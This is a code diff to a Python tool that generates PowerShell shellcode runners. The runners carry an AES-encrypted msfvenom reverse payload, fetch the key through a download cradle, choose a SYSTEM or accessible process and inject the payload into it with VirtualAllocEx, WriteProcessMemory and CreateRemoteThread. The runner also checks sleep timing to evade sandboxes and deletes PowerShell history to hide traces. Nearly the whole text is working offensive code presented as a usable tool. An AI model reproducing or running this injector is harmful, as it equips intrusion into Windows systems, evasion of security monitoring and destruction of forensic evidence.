@@ -30,18 +30,18 @@ if __name__ == '__main__':
 	Shellcode is AES-256 encrypted with a randomly generated key that is included in the runner.
 	Directly injects into an existing user specified process.
 	You must specify an injection target of the same or lower integrity than the context in which you have RCE.
+	If you are having trouble finding a suitable target process, specify 'any' and the script will find one for you!
 	Key/keyhost options modify Runner to contain second download cradle to retrieve AES-256 key separately to decrypt shellcode.
 	
 	Successfully injected processes:
-		Medium: explorer, svchost
-		High: sqlservr, spoolsv, dwm, svchost, winlogon	WARNING: svchost in high integrity may crash the target but has been shown to work. Also note Spoolsv may not have the same permissions as other system processes.
+		Medium Integrity: explorer, svchost
+		High Integrity: sqlservr, spoolsv, dwm, svchost, winlogon	WARNING: svchost in high integrity may crash the target but has been shown to work. Also note Spoolsv may not have the same permissions as other system processes.
 	'''))
 
 	#Req arguments
 	parser.add_argument('lhost', action='store', help='Lhost for msfvenom payload')
 	parser.add_argument('lport', action='store', help='Lport for msfvenom payload')
-	parser.add_argument('process', action='store', help='Process to inject payload into.  Must be same integrity or lower, no check for this exists!')
-	parser.add_argument('integrity', action='store', help='Integrity of target injection process( M for medium, H for high). Changes process PID selection behaviour.')
+	parser.add_argument('process', action='store', help='Process to inject payload into. Script injects into highest Integrity possible based on the current process\' privileges.')
 	parser.add_argument('execution_method', action='store', help='Options: \'ps\' OR \'cmd\'. Dictates whether PShistory command deletion is included as well as generation of a stager payload for cmd.exe implementations.')
 	
 	#Optional arguments
@@ -78,15 +78,18 @@ if __name__ == '__main__':
 	else:
 		print("Invalid selection.  Choose either 'cmd' for cmd.exe or 'ps' for powershell.exe")
 		sys.exit(0)
-	if args.integrity == "M":
-		pidfinder = "$procs=(get-process "+args.process+")"# | where-object CPU -GT 0);if($procs.Count -eq 0){$procs=(get-process "+args.process+")}"
-		integprint = "Medium"
-	elif args.integrity == "H":
-		pidfinder = "$procs=(get-process "+args.process+")"
-		integprint = "High"
+	
+	# finding target process
+	adminFinder = "$user=[Security.Principal.WindowsIdentity]::GetCurrent(); $isBoss=(New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)"
+	if args.process == 'any':
+		tgt_proc = ''
 	else:
-		print("Invalid integrity level selected, select either 'M' for medium or 'H' for high")
-		sys.exit(0)
+		tgt_proc = args.process
+	# If admin, get procs owned by SYSTEM, else get ones which you can read the path which means you have some kind of permission on it
+	low_priv_procs =  "$procs=(Get-Process "+tgt_proc+" | Where-Object {$_.Path -ne $null})"
+	high_priv_procs = "$procs=(Get-Process "+tgt_proc+" -IncludeUserName | Where-Object {$_.UserName -eq \"NT AUTHORITY\SYSTEM\"}); if($procs.Length -eq 0){"+low_priv_procs+"}"
+	pidfinder = "if($isBoss){"+high_priv_procs+"} else{"+low_priv_procs+"}"
+	
 	if args.key:
 		if args.keyhost:
 			separatekey = True
@@ -107,7 +110,7 @@ if __name__ == '__main__':
 		extra_args = "-e x64/xor_dynamic EXITFUNC=thread" #default encoder 
 	
 	msfvenomcommand = payload + "LHOST=" + args.lhost + " LPORT=" + args.lport + " -f ps1 " + extra_args #assemble msfvenom command
-	print("Attempt to inject into a " + integprint + " integrity " + args.process + " process")
+	print("Attempt to inject into " + args.process + " process")
 	print("Using Msfvenom command: msfvenom " + msfvenomcommand)
 	print("\nGenerating shellcode...")
 	shellcode = msfvenomrun(msfvenomcommand) #run msfvenom, capture output
@@ -189,28 +192,42 @@ $starttime = Get-Date -Displayhint Time
 Start-sleep -s 5
 $finishtime = Get-Date -Displayhint Time
 if ( $finishtime -le $starttime.addseconds(4.5) ) {
- exit
+  if($my_dbg){Write-Host "[-] Sl33p timing is off, something is sus, exiting >:("};exit
 }
 """ + key + """
-
 [Byte[]] $buf = getStrawberries $key
 
-""" + pidfinder + """
+""" + adminFinder + '\n' + pidfinder + """
+
 ForEach($proc in $procs){
- $hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $proc.Id)
- if($hprocess -ne 0){if($my_dbg){Write-Host \"[+] Successfully opened $($proc.id)\";};break;}
+  $hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $proc.Id)
+  if($hprocess -ne 0){
+    if($my_dbg){Write-Host "[+] Successfully opened $($proc.name),$($proc.id)"}
+    $addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40);
+    if($addr -eq 0){
+      if($my_dbg){Write-Host "[-] Unable to alloc Mem"}
+      continue
+    }
+    if($my_dbg){Write-Host "[+] Successfully allocd Mem"}
+
+    [Int32]$lpNumberOfBytesWritten = 0
+    $ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
+    if(!$ret){
+      if($my_dbg){Write-Host "[-] Unable to write Mem"}
+      continue
+    }
+    if($my_dbg){Write-Host "[+] Successfully wrote Mem"}
+
+    $ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
+    if($ret -eq 0){
+      if($my_dbg){Write-Host "[-] Unable to create thr34d"}
+      continue
+    }
+    if($my_dbg){Write-Host "[+] Successfully made thr34d"}
+    break
+  }
+  if($my_dbg){Write-Host "[-] Unable to open $($proc.name),$($proc.id)"}
 }
-if($hprocess -eq 0 -and $my_dbg){Write-Host "[-] Unable to OpenProcess"}
-
-$addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
-if($my_dbg){if($addr -ne 0){Write-Host \"[+] Successfully got Mem\"}else{Write-Host \"[-] Unable to get Mem\"}}
-
-[Int32]$lpNumberOfBytesWritten = 0
-$ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
-if($my_dbg){if($ret){Write-Host \"[+] Successfully wrote Mem\"}else{Write-Host \"[-] Unable to write Mem\"}}
-
-$ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
-if($my_dbg){if($ret -ne 0){Write-Host \\"[+] Successfully made thr34d\"}else{Write-Host \"[-] Unable to create thr34d\"}}
 """ + remhistory
 	with open(payloadfile,"w") as f:
 		f.write(runner)
